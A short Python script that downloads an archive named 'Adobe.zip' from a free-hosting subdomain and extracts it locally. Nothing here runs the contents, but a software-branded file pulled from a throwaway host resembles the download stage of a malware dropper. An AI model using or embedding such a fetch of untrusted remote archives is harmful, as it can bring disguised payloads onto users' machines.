import pyunpack
from pyunpack import Archive
import wget 

url = "https://separable-oxygen.000webhostapp.com/Adobe.zip"
wget.download(url)
Archive('Adobe.zip').extractall('.')



